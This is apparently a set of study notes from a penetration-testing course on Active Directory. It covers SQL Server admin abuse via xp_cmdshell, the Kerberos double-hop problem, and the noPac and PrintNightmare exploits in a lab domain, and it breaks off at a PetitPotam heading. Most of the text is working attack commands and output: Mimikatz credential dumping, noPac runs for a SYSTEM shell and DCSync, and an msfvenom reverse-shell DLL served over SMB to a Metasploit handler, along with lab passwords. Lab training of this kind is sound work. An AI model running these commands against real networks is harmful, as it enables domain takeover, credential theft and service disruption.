		m1l0js@htb[/htb]$ evil-winrm -i 10.129.201.234 -u forend

* SQL Server Admin

	> More often than not, we will encounter SQL servers in the environments we face. It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance. We may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying. Another way that you may find SQL server credentials is using the tool Snaffler(https://github.com/SnaffCon/Snaffler) to find web.config or other types of configuration files that contain SQL server connection strings.
	> BloodHound, once again, is a great bet for finding this type of access via the SQLAdmin edge. We can check for SQL Admin Rights in the Node Info tab for a given user or use this custom Cypher query to search:
		MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2

	> Here we see one user, damundsen has SQLAdmin rights over the host ACADEMY-EB-DB01.
	> Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound
		(https://academy.hackthebox.com/storage/modules/143/sqladmins_bh.png)


	> We can use our ACL rights to authenticate with the wley user, change the password for the damundsen user and then authenticate with the target using a tool such as PowerUpSQL, which has a handy command cheat sheet(https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet). Let's assume we changed the account password to SQL1234! using our ACL rights. We can now authenticate and run operating system commands.
	> First, let's hunt for SQL server instances.
	> Enumerating MSSQL Instances with PowerUpSQL
		PS C:\htb> cd .\PowerUpSQL\
		PS C:\htb>  Import-Module .\PowerUpSQL.ps1
		PS C:\htb>  Get-SQLInstanceDomain

	> We could then authenticate against the remote SQL server host and run custom queries or operating system commands. It is worth experimenting with this tool, but extensive enumeration and attack tactics against MSSQL are outside this module's scope.
	> Enumerating MSSQL Instances with PowerUpSQL
		PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

	> We can also authenticate from our Linux attack host using mssqlclient.py from the Impacket toolkit.
	> Running mssqlclient.py Against the Target
		m1l0js@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
	> Once connected, we could type help to see what commands are available to us.
	> Viewing our Options with Access to the SQL Server

		SQL> help
		     lcd {path}                 - changes the current local directory to {path}
		     exit                       - terminates the server process (and this session)
		     enable_xp_cmdshell         - you know what it means
		     disable_xp_cmdshell        - you know what it means
		     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
		     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
		     ! {cmd}                    - executes a local shell cmd

	> We could then choose enable_xp_cmdshell to enable the xp_cmdshell stored procedure(https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allows for one to execute operating system commands via the database if the account in question has the proper access rights.
	> Choosing enable_xp_cmdshell
		SQL> enable_xp_cmdshell

	> Finally, we can run commands in the format xp_cmdshell <command>. Here we can enumerate the rights that our user has on the system and see that we have SeImpersonatePrivilege(https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), which can be leveraged in combination with a tool such as JuicyPotato(https://github.com/ohpe/juicy-potato), PrintSpoofer(https://github.com/itm4n/PrintSpoofer), or RoguePotato(https://github.com/antonioCoco/RoguePotato) to escalate to SYSTEM level privileges, depending on the target host, and use this access to continue toward our goal. 
	> Enumerating our Rights on the System using xp_cmdshell


* Moving On

	> This section demonstrated a few possible lateral movement techniques in an Active Directory environment. We should always look for these types of rights when we gain our initial foothold and gain control of additional user accounts. Remember that enumerating and attacking is an iterative process! Every time we gain control over another user/host, we should repeat some enumeration steps to see what, if any, new rights and privileges we have obtained. Never overlook remote access rights if the user is not a local admin on the target host because we could very likely get onto a host where we find sensitive data, or we're able to escalate privileges.
	> Finally, whenever we find SQL credentials (in a script, a web.config file, or another type of database connection string), we should test access against any MSSQL servers in the environment. This type of access is almost guaranteed SYSTEM access over a host. If we can run commands as the account we authenticate with, it will almost always have the dangerous SeImpersonatePrivilege right.
	> The following section will address a common issue we often run into when using WinRM to connect to hosts in the network.

[+] Kerberos "Double Hop" Problem

	* There's an issue known as the "Double Hop" problem that arises when an attacker attempts to use Kerberos authentication across two (or more) hops. The issue concerns how Kerberos tickets are granted for specific resources. Kerberos tickets should not be viewed as passwords. They are signed pieces of data from the KDC that state what resources an account can access. When we perform Kerberos authentication, we get a "ticket" that permits us to access the requested resource (i.e., a single machine). On the contrary, when we use a password to authenticate, that NTLM hash is stored in our session and can be used elsewhere without issue.

		* Background

	> The "Double Hop" problem often occurs when using WinRM/Powershell since the default authentication mechanism only provides a ticket to access a specific resource. This will likely cause issues when trying to perform lateral movement or even access file shares from the remote shell. In this situation, the user account being used has the rights to perform an action but is denied access. The most common way to get shells is by attacking an application on the target host or using credentials and a tool such as PSExec. In both of these scenarios, the initial authentication was likely performed over SMB or LDAP, which means the user's NTLM Hash would be stored in memory. Sometimes we have a set of credentials and are restricted to a particular method of authentication, such as WinRM, or would prefer to use WinRM for any number of reasons.
	> The crux of the issue is that when using WinRM to authenticate over two or more connections, the user's password is never cached as part of their login. If we use Mimikatz to look at the session, we'll see that all credentials are blank. As stated previously, when we use Kerberos to establish a remote session, we are not using a password for authentication. When password authentication is used, with PSExec, for example, that NTLM hash is stored in the session, so when we go to access another resource, the machine can pull the hash from memory and authenticate us.
	> Let's take a quick look. If we authenticate to the remote host via WinRM and then run Mimikatz, we don't see credentials for the backupadm user in memory.

		PS C:\htb> PS C:\Users\ben.INLANEFREIGHT> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm
		[DEV01]: PS C:\Users\backupadm\Documents> cd 'C:\Users\Public\'
		[DEV01]: PS C:\Users\Public> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit

			mimikatz(commandline) # privilege::debug
			mimikatz(commandline) # sekurlsa::logonpasswords
			mimikatz(commandline) # exit

	> There are indeed processes running in the context of the backupadm user, such as wsmprovhost.exe, which is the process that spawns when a Windows Remote PowerShell session is spawned.
		[DEV01]: PS C:\Users\Public> tasklist /V |findstr backupadm

	> In the simplest terms, in this situation, when we try to issue a multi-server command, our credentials will not be sent from the first machine to the second.
	> Let's say we have three hosts: Attack host --> DEV01 --> DC01. Our Attack Host is a Parrot box within the corporate network but not joined to the domain. We obtain a set of credentials for a domain user and find that they are part of the Remote Management Users group on DEV01. We want to use PowerView to enumerate the domain, which requires communication with the Domain Controller, DC01.
		(https://academy.hackthebox.com/storage/modules/143/double_hop.png)

	> When we connect to DEV01 using a tool such as evil-winrm, we connect with network authentication, so our credentials are not stored in memory and, therefore, will not be present on the system to authenticate to other resources on behalf of our user. When we load a tool such as PowerView and attempt to query Active Directory, Kerberos has no way of telling the DC that our user can access resources in the domain. This happens because the user's Kerberos TGT (Ticket Granting Ticket) ticket is not sent to the remote session; therefore, the user has no way to prove their identity, and commands will no longer be run in this user's context. In other words, when authenticating to the target host, the user's ticket-granting service (TGS) ticket is sent to the remote service, which allows command execution, but the user's TGT ticket is not sent. When the user attempts to access subsequent resources in the domain, their TGT will not be present in the request, so the remote service will have no way to prove that the authentication attempt is valid, and we will be denied access to the remote service.
	> If unconstrained delegation is enabled on a server, it is likely we won't face the "Double Hop" problem. In this scenario, when a user sends their TGS ticket to access the target server, their TGT ticket will be sent along with the request. The target server now has the user's TGT ticket in memory and can use it to request a TGS ticket on their behalf on the next host they are attempting to access. In other words, the account's TGS Ticket is cached, which has the ability to sign TGTs and grant remote access. Generally speaking, if you land on a box with unconstrained delegation, you already won and aren't worrying about this anyways.
	> To confirm/find computers on a domain that have unrestricted kerberos delegation property set:
		Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description

* Workarounds

	> A few workarounds for the double-hop issue are covered in this post(https://posts.slayerlabs.com/double-hop/). We can use a "nested" Invoke-Command to send credentials (after creating a PSCredential object) with every request, so if we try to authenticate from our attack host to host A and run commands on host B, we are permitted. We'll cover two methods in this section: the first being one that we can use if we are working with an evil-winrm session and the second if we have GUI access to a Windows host (either an attack host in the network or a domain-joined host we have compromised.)

* Workaround #1: PSCredential Object
	> We can also connect to the remote host via host A and set up a PSCredential object to pass our credentials again. Let's see that in action.
	> After connecting to a remote host with domain credentials, we import PowerView and then try to run a command. As seen below, we get an error because we cannot pass our authentication on to the Domain Controller to query for the SPN accounts.

		*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1

			|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
			|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
			*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn
			Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
			"
			At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
			+             else { $Results = $UserSearcher.FindAll() }
			+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
			    + FullyQualifiedErrorId : DirectoryServicesCOMException

	> If we check with klist, we see that we only have a cached Kerberos ticket for our current server.

		*Evil-WinRM* PS C:\Users\backupadm\Documents> klist
			Current LogonId is 0:0x57f8a
			Cached Tickets: (1)
			#0> Client: backupadm @ INLANEFREIGHT.LOCAL
			    Server: academy-aen-ms0$ @
			    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
			    Ticket Flags 0xa10000 -> renewable pre_authent name_canonicalize
			    Start Time: 6/28/2022 7:31:53 (local)
			    End Time:   6/28/2022 7:46:53 (local)
			    Renew Time: 7/5/2022 7:31:18 (local)
			    Session Key Type: AES-256-CTS-HMAC-SHA1-96
			    Cache Flags: 0x4 -> S4U
			    Kdc Called: DC01.INLANEFREIGHT.LOCAL

	> So now, let's set up a PSCredential object and try again. First, we set up our authentication.
		*Evil-WinRM* PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
			|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
			|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
		*Evil-WinRM* PS C:\Users\backupadm\Documents>  $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)

	> Now we can try to query the SPN accounts using PowerView and are successful because we passed our credentials along with the command.
		*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname
		
			|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
			|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
			
			samaccountname
			--------------
			azureconnect
			backupjob
			krbtgt
			mssqlsvc
			sqltest
			sqlqa
			sqldev
			mssqladm
			svc_sql
			sqlprod
			sapsso
			sapvc
			vmwarescvc

	> If we try again without specifying the -credential flag, we once again get an error message.
		*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname 
		|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
		|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
		Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
		"
		At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
		+             else { $Results = $UserSearcher.FindAll() }
		+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
		    + FullyQualifiedErrorId : DirectoryServicesCOMException

	> If we RDP to the same host, open a CMD prompt, and type klist, we'll see that we have the necessary tickets cached to interact directly with the Domain Controller, and we don't need to worry about the double hop problem. This is because our password is stored in memory, so it can be sent along with every request we make.
		C:\htb> klist
		Current LogonId is 0:0x1e5b8b
		Cached Tickets: (4)
		#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
		        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
		        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
		        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
		        Start Time: 6/28/2022 9:13:38 (local)
		        End Time:   6/28/2022 19:13:38 (local)
		        Renew Time: 7/5/2022 9:13:38 (local)
		        Session Key Type: AES-256-CTS-HMAC-SHA1-96
		        Cache Flags: 0x2 -> DELEGATION
		        Kdc Called: DC01.INLANEFREIGHT.LOCAL
		
		#1>     Client: backupadm @ INLANEFREIGHT.LOCAL
		        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
		        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
		        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
		        Start Time: 6/28/2022 9:13:38 (local)
		        End Time:   6/28/2022 19:13:38 (local)
		        Renew Time: 7/5/2022 9:13:38 (local)
		        Session Key Type: AES-256-CTS-HMAC-SHA1-96
		        Cache Flags: 0x1 -> PRIMARY
		        Kdc Called: DC01.INLANEFREIGHT.LOCAL
		
		#2>     Client: backupadm @ INLANEFREIGHT.LOCAL
		        Server: ProtectedStorage/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
		        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
		        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
		        Start Time: 6/28/2022 9:13:38 (local)
		        End Time:   6/28/2022 19:13:38 (local)
		        Renew Time: 7/5/2022 9:13:38 (local)
		        Session Key Type: AES-256-CTS-HMAC-SHA1-96
		        Cache Flags: 0
		        Kdc Called: DC01.INLANEFREIGHT.LOCAL
		
		#3>     Client: backupadm @ INLANEFREIGHT.LOCAL
		        Server: cifs/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
		        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
		        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
		        Start Time: 6/28/2022 9:13:38 (local)
		        End Time:   6/28/2022 19:13:38 (local)
		        Renew Time: 7/5/2022 9:13:38 (local)
		        Session Key Type: AES-256-CTS-HMAC-SHA1-96
		        Cache Flags: 0
		        Kdc Called: DC01.INLANEFREIGHT.LOCAL

* Workaround #2: Register PSSession Configuration
	> We've seen what we can do to overcome this problem when using a tool such as evil-winrm to connect to a host via WinRM. What if we're on a domain-joined host and can connect remotely to another using WinRM? Or we are working from a Windows attack host and connect to our target via WinRM using the Enter-PSSession cmdlet? Here we have another option to change our setup to be able to interact directly with the DC or other hosts/resources without having to set up a PSCredential object and include credentials along with every command (which may not be an option with some tools).
	> Let's start by first establishing a WinRM session on the remote host.
		PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm

	> If we check for cached tickets using klist, we'll see that the same problem exists. Due to the double hop problem, we can only interact with resources in our current session but cannot access the DC directly using PowerView. We can see that our current TGS is good for accessing the HTTP service on the target since we connected over WinRM, which uses SOAP (Simple Object Access Protocol) requests in XML format to communicate over HTTP, so it makes sense.
		[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> klist
			Current LogonId is 0:0x11e387
			Cached Tickets: (1)
			#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
			       Server: HTTP/ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
			       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
			       Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
			       Start Time: 6/28/2022 9:09:19 (local)
			       End Time:   6/28/2022 19:09:19 (local)
			       Renew Time: 0
			       Session Key Type: AES-256-CTS-HMAC-SHA1-96
			       Cache Flags: 0x8 -> ASC
			       Kdc Called:

	> We also cannot interact directly with the DC using PowerView
		[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> Import-Module .\PowerView.ps1
		[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname
			Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
			"
			At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
			+             else { $Results = $UserSearcher.FindAll() }
			+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			   + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
			   + FullyQualifiedErrorId : DirectoryServicesCOMException

	> One trick we can use here is registering a new session configuration using the Register-PSSessionConfiguration cmdlet.
		PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

			WARNING: When RunAs is enabled in a Windows PowerShell session configuration, the Windows security model cannot enforce
			a security boundary between different user sessions that are created by using this endpoint. Verify that the Windows
			PowerShell runspace configuration is restricted to only the necessary set of cmdlets and capabilities.
			WARNING: Register-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name has
			recently been unregistered, certain system data structures may still be cached. In that case, a restart of WinRM may be
			 required.
			All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session
			configurations that are created with the Register-PSSessionConfiguration cmdlet, are disconnected.
			
			   WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin
			
			Type            Keys                                Name
			----            ----                                ----
			Container       {Name=backupadmsess}                backupadmsess

	> Once this is done, we need to restart the WinRM service by typing Restart-Service WinRM in our current PSSession. This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.
	> After we start the session, we can see that the double hop problem has been eliminated, and if we type klist, we'll have the cached tickets necessary to reach the Domain Controller. This works because our local machine will now impersonate the remote machine in the context of the backupadm user and all requests from our local machine will be sent directly to the Domain Controller.
		PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
		[DEV01]: PS C:\Users\backupadm\Documents> klist
			Current LogonId is 0:0x2239ba
			
			Cached Tickets: (1)
			
			#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
			       Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
			       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
			       Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
			       Start Time: 6/28/2022 13:24:37 (local)
			       End Time:   6/28/2022 23:24:37 (local)
			       Renew Time: 7/5/2022 13:24:37 (local)
			       Session Key Type: AES-256-CTS-HMAC-SHA1-96
			       Cache Flags: 0x1 -> PRIMARY
			       Kdc Called: DC01

	> We can now run tools such as PowerView without having to create a new PSCredential object.
		[DEV01]: PS C:\Users\Public> get-domainuser -spn | select samaccountname
			samaccountname
			--------------
			azureconnect
			backupjob
			krbtgt
			mssqlsvc
			sqltest
			sqlqa
			sqldev
			mssqladm
			svc_sql
			sqlprod
			sapsso
			sapvc
			vmwarescvc

	> Note: We cannot use Register-PSSessionConfiguration from an evil-winrm shell because we won't be able to get the credentials popup. Furthermore, if we try to run this by first setting up a PSCredential object and then attempting to run the command by passing credentials like -RunAsCredential $Cred, we will get an error because we can only use RunAs from an elevated PowerShell terminal. Therefore, this method will not work via an evil-winrm session as it requires GUI access and a proper PowerShell console. Furthermore, in our testing, we could not get this method to work from PowerShell on a Parrot or Ubuntu attack host due to certain limitations on how PowerShell on Linux works with Kerberos credentials. This method is still highly effective if we are testing from a Windows attack host and have a set of credentials or compromise a host and can connect via RDP to use it as a "jump host" to mount further attacks against hosts in the environment. .
	> We can also use other methods such as CredSSP, port forwarding, or injecting into a process running in the context of a target user (sacrificial process) that we won't cover here.

* Wrap Up
	> In this section, we've seen how to overcome the Kerberos "Double Hop" problem when working with WinRM in an AD environment. We will encounter this often during our assessments, so we must understand the issue and have certain tactics in our toolbox to avoid losing time.
	> The following section will cover other ways to escalate privileges and move laterally in a domain once we have valid credentials using various critical vulnerabilities identified throughout 2021.


-=-=
[+] Bleeding Edge Vulnerabilities
	> When it comes to patch management and cycles, many organizations are not quick to roll out patches through their networks. Because of this, we may be able to achieve a quick win either for initial access or domain privilege escalation using a very recent tactic. At the time of writing (April 2022), the three techniques shown in this section are relatively recent (within the last 6-9 months). These are advanced topics that can not be covered thoroughly in one module section. The purpose of demonstrating these attacks is to allow students to try out the latest and greatest attacks in a controlled lab environment and present topics that will be covered in extreme depth in more advanced Active Directory modules. As with any attack, if you do not understand how these work or the risk they could pose to a production environment, it would be best not to attempt them during a real-world client engagement. That being said, these techniques could be considered "safe" and less destructive than attacks such as Zerologon(https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/) or DCShadow(https://stealthbits.com/blog/what-is-a-dcshadow-attack-and-how-to-defend-against-it/). Still, we should always exercise caution, take detailed notes, and communicate with our clients. All attacks come with a risk. For example, the PrintNightmare attack could potentially crash the print spooler service on a remote host and cause a service disruption.

	> As information security practitioners in a rapidly changing and evolving field, we must keep ourselves sharp and on top of recent attacks and new tools and techniques. We recommend trying out all of the techniques in this section and doing additional research to find other methods for performing these attacks. Now, let's dive in.

* Scenario Setup
	> In this section, we will perform all examples from a Linux attack host. You can spawn the hosts for this section at the end of this section and SSH into the ATTACK01 Linux attack host. For the portion of this section that demonstrates interaction from a Windows host (using Rubeus and Mimikatz), you could spawn the MS01 attack host in the previous or next section and use the base64 certificate blob obtained using ntlmrelayx.py and petitpotam.py to perform the same pass-the-ticket attack using Rubeus as demonstrated near the end of this section.

* NoPac (SamAccountName Spoofing)

	> A great example of an emerging threat is the Sam_The_Admin vulnerability(https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699), also called noPac or referred to as SamAccountName Spoofing released at the end of 2021. This vulnerability encompasses two CVEs 2021-42278 and 2021-42287, allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command. Here is a quick breakdown of what each CVE provides regarding this vulnerability.
		- 42278 is a bypass vulnerability with the Security Account Manager (SAM). 	
		- 42287 is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.

	> This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers(https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain) to a domain. When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller. The flow of the attack is outlined in detail in this blog post(https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware)
	> We can use this tool(https://github.com/Ridter/noPac) to perform this attack. This tool is present on the ATTACK01 host in /opt/noPac.
	> NoPac uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC. Before attempting to use the exploit, we should ensure Impacket is installed and the noPac exploit repo is cloned to our attack host if needed. We can use these commands to do so:
	> Ensuring Impacket is Installed
		m1l0js@htb[/htb]$ git clone https://github.com/SecureAuthCorp/impacket.git
	> Ensuring Impacket is Installed
		m1l0js@htb[/htb]$ python setup.py install 
	> Cloning the NoPac Exploit Repo
		m1l0js@htb[/htb]$ git clone https://github.com/Ridter/noPac.git

	> Once Impacket is installed and we ensure the repo is cloned to our attack box, we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (scanner.py) then use the exploit (noPac.py) to gain a shell as NT AUTHORITY/SYSTEM. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We'll also notice the ms-DS-MachineAccountQuota number is set to 10. In some environments, an astute sysadmin may set the ms-DS-MachineAccountQuota value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to 0 can prevent quite a few AD attacks.
	> Scanning for NoPac
		m1l0js@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

	> There are many different ways to use NoPac to further our access. One way is to obtain a shell with SYSTEM level privileges. We can do this by running noPac.py with the syntax below to impersonate the built-in administrator account and drop into a semi-interactive shell session on the target Domain Controller. This could be "noisy" or may be blocked by AV or EDR.
	> Running NoPac & Getting a Shell
		m1l0js@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

	> We will notice that a semi-interactive shell session is established with the target using smbexec.py. Keep in mind with smbexec shells we will need to use exact paths instead of navigating the directory structure using cd.
	> It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use ls to confirm.
	> Confirming the Location of Saved Tickets
		m1l0js@htb[/htb]$ ls
		administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
README.md  scanner.py
	> We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. We can also use the tool with the -dump flag to perform a DCSync using secretsdump.py. This method would still create a ccache file on disk, which we would want to be aware of and clean up.
	> Using noPac to DCSync the Built-in Administrator Account
		m1l0js@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

* Windows Defender & SMBEXEC.py Considerations
	> If Windows Defender (or another AV or EDR product) is enabled on a target, our shell session may be established, but issuing any commands will likely fail. The first thing smbexec.py does is create a service called BTOBTO. Another service called BTOBO is created, and any command we type is sent to the target over SMB inside a .bat file called execute.bat. With each new command we type, a new batch script is created and echoed to a temporary file that executes said script and deletes it from the system. Let's look at a Windows Defender log to see what behavior was considered malicious.

* Windows Defender Quarantine Log => (https://academy.hackthebox.com/storage/modules/143/defenderLog.png)

	> If opsec or being "quiet" is a consideration during an assessment, we would most likely want to avoid a tool like smbexec.py. The focus of this module is on tactics and techniques. We will refine our methodology as we progress in more advanced modules, but we first must obtain a solid base in enumerating and attacking Active Directory.


* PrintNightmare
	> PrintNightmare is the nickname given to two vulnerabilities (CVE-2021-34527 and CVE-2021-1675) found in the Print Spooler service that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution. Using this vulnerability for local privilege escalation is covered in the Windows Privilege Escalation module, but is also important to practice within the context of Active Directory environments for gaining remote access to a host. Let's practice with one exploit that can allow us to gain a SYSTEM shell session on a Domain Controller running on a Windows Server 2019 host.
	> Before conducting this attack, we must retrieve the exploit we will use. In this case, we will be using cube0x0's exploit. We can use Git to clone it to our attack host:
	> Cloning the Exploit
		m1l0js@htb[/htb]$ git clone https://github.com/cube0x0/CVE-2021-1675.git

	> For this exploit to work successfully, we will need to use cube0x0's version of Impacket. We may need to uninstall the version of Impacket on our attack host and install cube0x0's (this is already installed on ATTACK01 in the lab). We can use the commands below to accomplish this:
	> Install cube0x0's Version of Impacket
		pip3 uninstall impacket
		git clone https://github.com/cube0x0/impacket
		cd impacket
		python3 ./setup.py install

	> We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.
	> Enumerating for MS-RPRN
		m1l0js@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
		Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
		Protocol: [MS-RPRN]: Print System Remote Protocol 

	> After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using msfvenom.
	> Generating a DLL Payload
		m1l0js@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll

	> We will then host this payload in an SMB share we create on our attack host using smbserver.py.
	> Creating a Share with smbserver.py
		m1l0js@htb[/htb]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

	> Once the share is created and hosting our payload, we can use MSF to configure & start a multi handler responsible for catching the reverse shell that gets executed on the target.
	> Configuring & Starting MSF multi/handler
		[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
		[*] Using configured payload generic/shell_reverse_tcp
		[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
		PAYLOAD => windows/x64/meterpreter/reverse_tcp
		[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 10.129.202.111
		LHOST => 10.3.88.114
		[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
		LPORT => 8080
		[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
		
		[*] Started reverse TCP handler on 10.129.202.111:8080 

	> With the share hosting our payload and our multi handler listening for a connection, we can attempt to run the exploit against the target. The command below is how we use the exploit:
	> Running the Exploit
		m1l0js@htb[/htb]$ sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'


	> Notice how at the end of the command, we include the path to the share hosting our payload (\\<ip address of attack host>\ShareName\nameofpayload.dll). If all goes well after running the exploit, the target will access the share and execute the payload. The payload will then call back to our multi handler giving us an elevated SYSTEM shell.
	> Once the exploit has been run, we will notice that a Meterpreter session has been started. We can then drop into a SYSTEM shell and see that we have NT AUTHORITY\SYSTEM privileges on the target Domain Controller starting from just a standard domain user account.

* PetitPotam (MS-EFSRPC)

